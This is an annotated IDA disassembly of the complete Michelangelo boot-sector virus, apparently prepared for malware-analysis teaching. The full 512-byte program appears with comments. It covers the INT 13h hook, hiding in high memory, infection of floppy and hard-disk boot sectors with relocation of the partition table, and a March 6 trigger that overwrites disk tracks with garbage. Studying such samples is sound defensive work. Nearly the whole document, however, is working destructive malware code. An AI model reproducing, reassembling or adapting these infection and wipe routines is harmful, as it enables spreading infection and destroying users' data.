seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2018 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-3075-7234-77                      |
seg000:7C00 ; |             Golden Richard, LSU Louisiana State University              |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : C:\Users\golden\Desktop\michelangelo-sample\michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 0000h - 0200h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model flat
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Regular
seg000:7C00 seg000          segment byte public '' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     ProgramStart    ; jump to start of program
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C03 hidden_mem_jmp  db 0F5h                 ; DATA XREF: seg000:7CF0↓r
seg000:7C04                 db    0
seg000:7C05 hidden_mem_offset dw 0                  ; DATA XREF: seg000:7CD8↓w
seg000:7C07                 db    2
seg000:7C08 drive_type      db  0Eh
seg000:7C09                 db    0
seg000:7C0A int13_offset    dw 9739h                ; DATA XREF: seg000:7CC1↓w
seg000:7C0C int13_segment   dw 0F000h               ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ; ---------------------------------------------------------------------------
seg000:7C0E                 push    ds              ; start of evil int13
seg000:7C0E                                         ; saving registers
seg000:7C0F                 push    ax
seg000:7C10                 or      dl, dl          ; check if operating on boot drive
seg000:7C12                 jnz     short do_real_int13_and_ret ; if on boot drive, assume infected and jump
seg000:7C14                 xor     ax, ax
seg000:7C16                 mov     ds, ax
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; check if drive motor running
seg000:7C1D                 jnz     short do_real_int13_and_ret ; if motor running, assume infected and jump
seg000:7C1F                 pop     ax              ; pop reggies
seg000:7C20                 pop     ds
seg000:7C21                 pushf
seg000:7C22                 call    dword ptr cs:0Ah ; do real int13
seg000:7C27                 pushf                   ; save flags from int13
seg000:7C28                 call    infection_routine ; do infection routine
seg000:7C2B                 popf                    ; pop flags from real int13
seg000:7C2C                 retf    2               ; return to caller
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F do_real_int13_and_ret:                  ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax              ; pop reggies
seg000:7C30                 pop     ds
seg000:7C31                 jmp     dword ptr cs:0Ah ; do real int13 and return to caller
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
seg000:7C36
seg000:7C36 infection_routine proc near             ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax              ; save registers
seg000:7C37                 push    bx
seg000:7C38                 push    cx
seg000:7C39                 push    dx
seg000:7C3A                 push    ds
seg000:7C3B                 push    es
seg000:7C3C                 push    si
seg000:7C3D                 push    di
seg000:7C3E                 push    cs
seg000:7C3F                 pop     ds
seg000:7C40                 push    cs
seg000:7C41                 pop     es
seg000:7C42                 mov     si, 4           ; disk read try count = 4
seg000:7C45
seg000:7C45 boot_sec_read:                          ; CODE XREF: infection_routine+29↓j
seg000:7C45                 mov     ax, 201h        ; read 1 sector...
seg000:7C48                 mov     bx, 200h        ; ...into memory higher than virus code...
seg000:7C4B                 mov     cx, 1           ; ...starting at track 0, sector 1...
seg000:7C4E                 xor     dx, dx          ; ...from the boot drive
seg000:7C50                 pushf                   ; push current flags
seg000:7C51                 call    dword ptr ds:0Ah ; read boot sector into high memory
seg000:7C55                 jnb     short check_drive_infected ; jump if no error on disk read
seg000:7C57                 xor     ax, ax
seg000:7C59                 pushf
seg000:7C5A                 call    dword ptr ds:0Ah ; if error, reset disk
seg000:7C5E                 dec     si              ; decrement try count
seg000:7C5F                 jnz     short boot_sec_read ; try read again if si != 0
seg000:7C61                 jmp     short return_to_caller ; otherwise, return to caller
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 check_drive_infected:                   ; CODE XREF: infection_routine+1F↑j
seg000:7C63                 xor     si, si          ; clear source index
seg000:7C65                 cld                     ; set load direction forward
seg000:7C66                 lodsw                   ; load first two bytes of disk
seg000:7C67                 cmp     ax, [bx]        ; compare first two bytes of disk and virus
seg000:7C69                 jnz     short set_drive_type ; jump if drive not infected
seg000:7C6B                 lodsw                   ; load and...
seg000:7C6C                 cmp     ax, [bx+2]      ; ...compare next two bytes
seg000:7C6F                 jz      short return_to_caller ; jump if drive infected
seg000:7C71
seg000:7C71 set_drive_type:                         ; CODE XREF: infection_routine+33↑j
seg000:7C71                 mov     ax, 301h        ; write 1 sector...
seg000:7C74                 mov     dh, 1           ; ...at head 1...
seg000:7C76                 mov     cl, 3           ; ...at sector 3
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; check disk type
seg000:7C7C                 jz      short infect_drive ; jump if floppy
seg000:7C7E                 mov     cl, 0Eh         ; if not floppy, write to sector 14
seg000:7C80
seg000:7C80 infect_drive:                           ; CODE XREF: infection_routine+46↑j
seg000:7C80                 mov     ds:8, cx        ; save drive type
seg000:7C84                 pushf                   ; push flags
seg000:7C85                 call    dword ptr ds:0Ah ; copy boot sector to new spot on disk
seg000:7C89                 jb      short return_to_caller ; if error, return
seg000:7C8B                 mov     si, 3BEh        ; start of partition table
seg000:7C8E                 mov     di, 1BEh        ; destination for partition table
seg000:7C91                 mov     cx, 21h ; '!'   ; length of partition table
seg000:7C94                 cld                     ; copy forward
seg000:7C95                 rep movsw               ; copy partition table in high memory into virus
seg000:7C97                 mov     ax, 301h        ; write 1 sector...
seg000:7C9A                 xor     bx, bx          ; ...starting from virus start
seg000:7C9C                 mov     cx, 1           ; ...write to sector 1...
seg000:7C9F                 xor     dx, dx          ; ...write to boot drive
seg000:7CA1                 pushf                   ; push flags
seg000:7CA2                 call    dword ptr ds:0Ah ; copy virus to disk
seg000:7CA6
seg000:7CA6 return_to_caller:                       ; CODE XREF: infection_routine+2B↑j
seg000:7CA6                                         ; infection_routine+39↑j ...
seg000:7CA6                 pop     di              ; pop registers
seg000:7CA7                 pop     si
seg000:7CA8                 pop     es
seg000:7CA9                 pop     ds
seg000:7CAA                 pop     dx
seg000:7CAB                 pop     cx
seg000:7CAC                 pop     bx
seg000:7CAD                 pop     ax
seg000:7CAE                 retn                    ; return to caller
seg000:7CAE infection_routine endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF ProgramStart:                           ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; start of program
seg000:7CAF                                         ; clear ax
seg000:7CB1                 mov     ds, ax          ; clear ds
seg000:7CB3                 cli                     ; stop interupts
seg000:7CB4                 mov     ss, ax          ; set up stack segment
seg000:7CB6                 mov     ax, 7C00h
seg000:7CB9                 mov     sp, ax          ; start stack below program code
seg000:7CBB                 sti                     ; resume interupts
seg000:7CBC                 push    ds
seg000:7CBD                 push    ax
seg000:7CBE                 mov     ax, ds:4Ch      ; get segment of int13 pointer
seg000:7CC1                 mov     ds:int13_offset, ax ; store it in program data
seg000:7CC4                 mov     ax, ds:4Eh      ; get offset of int13 pointer
seg000:7CC7                 mov     ds:int13_segment, ax ; store it in program data
seg000:7CCA                 mov     ax, ds:413h     ; get memory size in kb
seg000:7CCD                 dec     ax              ; decrement it by 2k
seg000:7CCE                 dec     ax
seg000:7CCF                 mov     ds:413h, ax     ; overwrite memory size with new value
seg000:7CD2                 mov     cl, 6
seg000:7CD4                 shl     ax, cl          ; shift memory size by 6 bits to convert to offset
seg000:7CD6                 mov     es, ax          ; store converted offset in es
seg000:7CD8                 mov     ds:hidden_mem_offset, ax ; store high memory offset location
seg000:7CDB                 mov     ax, 0Eh         ; evil int13 handler offset
seg000:7CDE                 mov     ds:4Ch, ax      ; overwrite real int13 offset with evil one
seg000:7CE1                 mov     word ptr ds:4Eh, es ; overwrite real int13 segment with evil one
seg000:7CE5                 mov     cx, 1BEh        ; length of program
seg000:7CE8                 mov     si, 7C00h       ; start address for copy: start of program
seg000:7CEB                 xor     di, di          ; clear destination index
seg000:7CED                 cld                     ; copy direction forward
seg000:7CEE                 rep movsb               ; copy program to hidden memory
seg000:7CF0                 jmp     dword ptr cs:hidden_mem_jmp ; jump to next line but in hidden memory
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax          ; clear ax
seg000:7CF7                 mov     es, ax          ; clear es
seg000:7CF9                 int     13h             ; call infected int13
seg000:7CFB                 push    cs
seg000:7CFC                 pop     ds
seg000:7CFD                 mov     ax, 201h        ; read 1 sector
seg000:7D00                 mov     bx, 7C00h       ; into 7C00
seg000:7D03                 mov     cx, ds:8        ; get drive type
seg000:7D07                 cmp     cx, 7           ; check if type == 7
seg000:7D0A                 jnz     short handle_hard_drive ; if true, jump
seg000:7D0C                 mov     dx, 80h         ; read from hard drive
seg000:7D0F                 int     13h             ; read real boot sector into memory
seg000:7D11                 jmp     short check_kill_date
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 handle_hard_drive:                      ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; get drive type
seg000:7D17                 mov     dx, 100h        ; use head 1
seg000:7D1A                 int     13h             ; read real boot sector into memory
seg000:7D1C                 jb      short check_kill_date ; jump if error
seg000:7D1E                 push    cs              ; save registers
seg000:7D1F                 pop     es
seg000:7D20                 mov     ax, 201h        ; read 1 sector
seg000:7D23                 mov     bx, 200h        ; into memory above virus
seg000:7D26                 mov     cx, 1           ; track 0, sector 1
seg000:7D29                 mov     dx, 80h         ; from boot drive
seg000:7D2C                 int     13h             ; read boot drive boot sector to above virus
seg000:7D2E                 jb      short check_kill_date ; jump if error
seg000:7D30                 xor     si, si          ; clear source index
seg000:7D32                 cld                     ; copy direction forward
seg000:7D33                 lodsw                   ; load first two bytes of disk
seg000:7D34                 cmp     ax, [bx]        ; compare to virus for 4 bytes
seg000:7D34                                         ; if not equal, jump
seg000:7D36                 jnz     short infect_hard_drive
seg000:7D38                 lodsw
seg000:7D39                 cmp     ax, [bx+2]
seg000:7D3C                 jnz     short infect_hard_drive
seg000:7D3E
seg000:7D3E check_kill_date:                        ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx
seg000:7D40                 mov     ah, 4           ; set ah=4 to read date
seg000:7D42                 int     1Ah             ; check current date
seg000:7D44                 cmp     dx, 306h        ; check if date = 3/6
seg000:7D48                 jz      short loc_7D4B  ; jump if date matched
seg000:7D4A                 retf                    ; otherwise, return and allow boot
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B loc_7D4B:                               ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; clear dx
seg000:7D4D                 mov     cx, 1           ; cx=1
seg000:7D50
seg000:7D50 set_params_for_drive_type:              ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h        ; set ax for disk type
seg000:7D53                 mov     si, ds:8        ; get drive type
seg000:7D57                 cmp     si, 3           ; check if type == 3
seg000:7D5A                 jz      short trash_disk ; jump if 3
seg000:7D5C                 mov     al, 0Eh         ; set al for disk type
seg000:7D5E                 cmp     si, 0Eh         ; compare type
seg000:7D61                 jz      short trash_disk ; jump if equal
seg000:7D63                 mov     dl, 80h         ; set dl for hard drive
seg000:7D65                 mov     byte ptr ds:7, 4 ; save drive type to program memory
seg000:7D6A                 mov     al, 11h         ; set al for hard disk
seg000:7D6C
seg000:7D6C trash_disk:                             ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h       ; random memory source
seg000:7D6F                 mov     es, bx          ; setting es
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; trask disk with garbage memory
seg000:7D73                 jnb     short loc_7D79  ; jump if no error
seg000:7D75                 xor     ah, ah          ; set ah to reset disk
seg000:7D77                 int     13h             ; reset disk
seg000:7D79
seg000:7D79 loc_7D79:                               ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; next head for drive write
seg000:7D7B                 cmp     dh, ds:7        ; check for floppy
seg000:7D7F                 jb      short set_params_for_drive_type ; jump if floppy
seg000:7D81                 xor     dh, dh          ; clear head number
seg000:7D83                 inc     ch              ; increment track number
seg000:7D85                 jmp     short set_params_for_drive_type
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 infect_hard_drive:                      ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7
seg000:7D8A                 mov     ds:8, cx        ; get drive type
seg000:7D8E                 mov     ax, 301h        ; write 1 sector...
seg000:7D91                 mov     dx, 80h         ; to hard drive
seg000:7D94                 int     13h             ; copy virus to hard drive
seg000:7D96                 jb      short check_kill_date ; if error, jump
seg000:7D98                 mov     si, 3BEh        ; read partition table
seg000:7D9B                 mov     di, 1BEh        ; into virus code
seg000:7D9E                 mov     cx, 21h ; '!'   ; length of partition table
seg000:7DA1                 rep movsw               ; copy table into virus
seg000:7DA3                 mov     ax, 301h        ; write one sector
seg000:7DA6                 xor     bx, bx          ; clear buffer offset
seg000:7DA8                 inc     cl              ; writing to next sector on disk
seg000:7DAA                 int     13h             ; copy virus to disk
seg000:7DAC                 jmp     short check_kill_date
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db    0
seg000:7DAF                 db    0
seg000:7DB0                 db    0
seg000:7DB1                 db    0
seg000:7DB2                 db    0                 ; space for partition table
seg000:7DB3                 db    0
seg000:7DB4                 db    0
seg000:7DB5                 db    0
seg000:7DB6                 db    0
seg000:7DB7                 db    0
seg000:7DB8                 db    0
seg000:7DB9                 db    0
seg000:7DBA                 db    0
seg000:7DBB                 db    0
seg000:7DBC                 db    0
seg000:7DBD                 db    0
seg000:7DBE                 db    0
seg000:7DBF                 db    0
seg000:7DC0                 db    0
seg000:7DC1                 db    0
seg000:7DC2                 db    0
seg000:7DC3                 db    0
seg000:7DC4                 db    0
seg000:7DC5                 db    0
seg000:7DC6                 db    0
seg000:7DC7                 db    0
seg000:7DC8                 db    0
seg000:7DC9                 db    0
seg000:7DCA                 db    0
seg000:7DCB                 db    0
seg000:7DCC                 db    0
seg000:7DCD                 db    0
seg000:7DCE                 db    0
seg000:7DCF                 db    0
seg000:7DD0                 db    0
seg000:7DD1                 db    0
seg000:7DD2                 db    0
seg000:7DD3                 db    0
seg000:7DD4                 db    0
seg000:7DD5                 db    0
seg000:7DD6                 db    0
seg000:7DD7                 db    0
seg000:7DD8                 db    0
seg000:7DD9                 db    0
seg000:7DDA                 db    0
seg000:7DDB                 db    0
seg000:7DDC                 db    0
seg000:7DDD                 db    0
seg000:7DDE                 db    0
seg000:7DDF                 db    0
seg000:7DE0                 db    0
seg000:7DE1                 db    0
seg000:7DE2                 db    0
seg000:7DE3                 db    0
seg000:7DE4                 db    0
seg000:7DE5                 db    0
seg000:7DE6                 db    0
seg000:7DE7                 db    0
seg000:7DE8                 db    0
seg000:7DE9                 db    0
seg000:7DEA                 db    0
seg000:7DEB                 db    0
seg000:7DEC                 dw 0
seg000:7DEE                 db    0
seg000:7DEF                 db    0
seg000:7DF0                 db    0
seg000:7DF1                 db    0
seg000:7DF2                 db    0
seg000:7DF3                 db    0
seg000:7DF4                 db    0
seg000:7DF5                 db    0
seg000:7DF6                 db    0
seg000:7DF7                 db    0
seg000:7DF8                 db    0
seg000:7DF9                 db    0
seg000:7DFA                 db    0
seg000:7DFB                 db    0
seg000:7DFC                 db    0
seg000:7DFD                 db    0
seg000:7DFE                 db  55h ; U             ; mbr signature
seg000:7DFF                 db 0AAh
seg000:7DFF seg000          ends
seg000:7DFF
seg000:7DFF
seg000:7DFF                 end
